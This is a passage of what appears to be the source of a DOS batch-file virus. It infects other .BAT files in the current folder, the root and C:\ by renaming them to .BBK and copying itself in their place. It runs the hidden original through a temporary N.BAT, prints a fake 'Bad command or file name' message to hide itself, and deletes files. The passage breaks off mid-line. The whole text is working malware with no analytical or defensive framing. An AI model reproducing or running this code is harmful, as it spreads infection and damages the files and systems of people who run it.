@ECHO OFF
IF %1X==/COPYVIRX GOTO COPY
IF %1X==/COPYVIR2X GOTO COPY2
IF %1X==/RENVIRX GOTO REN
IF %1X==/SETVIRX GOTO SET
IF NOT EXIST %0.BAT GOTO SICK
SET F=
IF NOT EXIST %0.BBK SET F=N
SET CD=.\
CALL %0 /COPYVIR
SET CD=\
CALL %0 /COPYVIR
SET CD=C:\
CALL %0 /COPYVIR
IF %F%X==NX ECHO @DEL %0.BAT > \N.BAT
IF %F%X==NX ECHO @IF EXIST %0.BBK DEL %0.BBK >> \N.BAT
IF %F%X==NX ECHO Bad command or file name
IF %F%X==NX ECHO \N.BAT >> %0.BAT
IF %F%X==NX GOTO END
TYPE %0.BBK > \N.BAT
@ECHO ON
@CALL \N.BAT %1 %2 %3 %4 %5 %6 %7 %8 %9
@ECHO OFF
IF EXIST \N.BAT DEL \N.BAT
GOTO END
:REN
echo\>DAKUMA\%2
IF EXIST DAKUMA\%0.BAT GOTO RENNOT
GOTO RENOK
:RENNOT
for %%a in (DAKUMA\*.*) DO DEL %%a
GOTO END
:RENOK
for %%a in (DAKUMA\*.*) DO DEL %%a
REN %2 *.BBK
ECHO\>%2
GOTO END
:COPY
IF EXIST %CD%*.BBK GOTO END
ECHO\ > \N.BAT
MD DAKUMA
FOR %%D IN (%CD%*.BAT) DO ECHO CALL %0 /RENVIR %%D>>\N.BAT
CALL \N.BAT
FOR %%B IN (%CD%*.BAT) DO CALL %0 /COPYVIR2 %%B
RD DAKUMA
GOTO END
:COPY2
echo\>DAKUMA\%2
IF EXIST DAKUMA\%0.BAT GOTO cpyNOT
GOTO cpyOK
:cpyNOT
for %%a in (DAKUMA\*.*